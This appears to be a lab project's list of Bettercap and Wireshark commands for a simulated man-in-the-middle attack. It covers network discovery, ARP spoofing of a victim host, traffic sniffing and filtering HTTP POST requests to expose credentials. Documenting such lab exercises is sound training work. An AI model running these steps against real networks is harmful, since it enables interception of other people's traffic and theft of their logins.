#3 Commands Used – Bettercap MITM Project

This document lists the commands used during the MITM attack simulation project.  
All commands were executed in a controlled lab environment on self-owned virtual machines.

---

## Phase 3 – Network Reconnaissance

### Launch Bettercap from kali linux

sudo bettercap

### Display Network Interfaces and Hosts

net.show

### Enable Active Network Discovery

net.probe on

---

## Phase 4 – MITM Positioning (ARP Spoofing)

### Enable ARP Spoofing Module

arp.spoof on

### Define Victim Target

set arp.spoof.targets <VICTIM_IP>

### Enable Full-Duplex MITM

set arp.spoof.fullduplex true

### Re-enable ARP Spoofing

arp.spoof on

---

## Phase 5 – Traffic Interception & Analysis

### Enable Packet Sniffing (Bettercap)

net.sniff on

### View Sniffing Statistics

net.sniff.stats

### Wireshark Packet Capture (Kali Linux)

Start Wireshark

sudo wireshark

---

## Phase 6 – Credential Exposure Analysis

### Filter HTTP Authentication Traffic

http.request.method == "POST"

### Victim-Side Verification Commands

#### Windows – Check ARP Table

arp -a

#### Ubuntu – Check ARP Cache

ip neigh

### Connectivity Verification

#### Windows

ping 8.8.8.8

#### Ubuntu

ping 8.8.8.8

## Stop Sniffing

net.sniff off

## Exit Bettercap

quit

